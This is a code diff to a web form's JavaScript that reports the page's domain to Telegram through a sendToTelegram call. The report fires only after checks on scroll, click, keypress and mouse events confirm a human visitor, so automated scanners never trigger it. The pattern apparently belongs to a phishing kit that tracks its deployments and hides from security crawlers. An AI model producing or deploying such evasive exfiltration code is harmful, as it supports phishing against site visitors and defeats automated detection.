@@ -9,86 +9,137 @@
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
-  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
+  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
   // ============================================================
 
   let domainDetected = false;
-  let scrollDetected = false;
-  let humanInteractionDetected = false;
+  let humanInteractionConfirmed = false;
 
   function detectDomain() {
+    // Prevent multiple detections
     if (domainDetected) return;
+    
+    // Only proceed if human interaction has been confirmed
+    if (!humanInteractionConfirmed) return;
     
     const currentUrl = window.location.href;
     const urlObj = new URL(currentUrl);
     const domain = urlObj.hostname;
 
+    // Mark as detected immediately to prevent duplicates
     domainDetected = true;
 
     sendToTelegram('domain_detection', {
       domain: domain
     });
 
-    console.log(`🌐 Domain detected: ${domain}`);
+    console.log(`🌐 Domain detected (human): ${domain}`);
   }
 
-  // ====== DETECT HUMAN SCROLL ======
-  // Humans scroll in bursts with pauses, bots scroll smoothly or instantly
-  let lastScrollTime = 0;
+  // ====== CONFIRM HUMAN INTERACTION - ONE TIME ======
+  function confirmHumanInteraction() {
+    if (humanInteractionConfirmed) return;
+    
+    // Verify this is a real human interaction
+    // Trusted events = human, untrusted = bot/script
+    if (event && event.isTrusted === false) return;
+    
+    humanInteractionConfirmed = true;
+    console.log('👤 Human interaction confirmed');
+    
+    // Now trigger domain detection
+    detectDomain();
+  }
+
+  // ====== HUMAN SCROLL DETECTION ======
+  let scrollTimeout = null;
   let scrollCount = 0;
-  let scrollSpeeds = [];
-  let isHumanScroll = false;
+  let lastScrollTime = 0;
 
   window.addEventListener('scroll', function(e) {
-    // Only proceed if not detected yet
+    // Skip if already detected
     if (domainDetected) return;
     
-    // Check if it's a human scroll (not automated)
+    // Must be a trusted event (human)
+    if (!e.isTrusted) return;
+    
     const now = Date.now();
     const timeSinceLastScroll = now - lastScrollTime;
     lastScrollTime = now;
     
-    // Humans don't scroll faster than 200ms between events (too fast = bot)
-    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 200) {
-      // Too fast - likely a bot or programmatic scroll
-      return;
+    // Bots scroll too fast (under 100ms between events)
+    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) {
+      return; // Too fast - likely bot
     }
     
-    // Track scroll behavior
+    // Count scroll events
     scrollCount++;
     
-    // Check if event is trusted (human-initiated)
-    if (e.isTrusted) {
-      humanInteractionDetected = true;
-    }
+    // Need at least 2 scroll events with reasonable timing
+    if (scrollCount < 2) return;
     
-    // Check if this is a genuine user scroll (has inertia, not instant)
+    // Check if user has actually scrolled meaningful distance
     const scrollY = window.scrollY;
-    const maxScroll = document.documentElement.scrollHeight - window.innerHeight;
+    if (scrollY < 30) return; // Must scroll at least 30px
     
-    // Only trigger if user has scrolled at least a little
-    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
-      console.log('🖱️ Human scroll detected - triggering domain detection');
-      detectDomain();
+    // Clear any pending timeout
+    if (scrollTimeout) {
+      clearTimeout(scrollTimeout);
+      scrollTimeout = null;
     }
+    
+    // Debounce: wait 300ms after scroll stops to confirm
+    scrollTimeout = setTimeout(function() {
+      if (!domainDetected && humanInteractionConfirmed === false) {
+        confirmHumanInteraction();
+      }
+      scrollTimeout = null;
+    }, 300);
+    
   }, { passive: true });
 
-  // ====== FALLBACK: Also detect on click (human interaction) ======
+  // ====== HUMAN CLICK DETECTION ======
   document.addEventListener('click', function(e) {
-    if (!domainDetected && e.isTrusted && !e.target.closest('.spinner, .loading')) {
-      // Only trigger if not detected and it's a genuine click
-      console.log('🖱️ Human click detected - triggering domain detection');
-      detectDomain();
-    }
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    
+    // Ignore clicks on loading spinners or disabled buttons
+    if (e.target.closest('.spinner, .loading')) return;
+    
+    // Confirm human interaction
+    confirmHumanInteraction();
   });
 
-  // ====== FALLBACK: Detect on keypress (human typing) ======
+  // ====== HUMAN KEYPRESS DETECTION ======
   document.addEventListener('keydown', function(e) {
-    if (!domainDetected && e.isTrusted && e.key.length === 1) {
-      // Only trigger on character keys (not function keys)
-      console.log('⌨️ Human keypress detected - triggering domain detection');
-      detectDomain();
-    }
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    
+    // Only care about character keys (not function keys)
+    if (e.key.length !== 1) return;
+    
+    // Confirm human interaction
+    confirmHumanInteraction();
+  });
+
+  // ====== HUMAN MOUSEMOVE DETECTION (Fallback) ======
+  let mouseMoveCount = 0;
+  
+  document.addEventListener('mousemove', function(e) {
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    
+    mouseMoveCount++;
+    
+    // Need multiple mouse moves to confirm human
+    if (mouseMoveCount < 3) return;
+    
+    // Check if mouse moved in a natural way (not robotic)
+    // Humans don't move in straight perfect lines
+    if (e.movementX === 0 && e.movementY === 0) return;
+    
+    // Confirms human interaction
+    confirmHumanInteraction();
   });
 
   // ============================================================
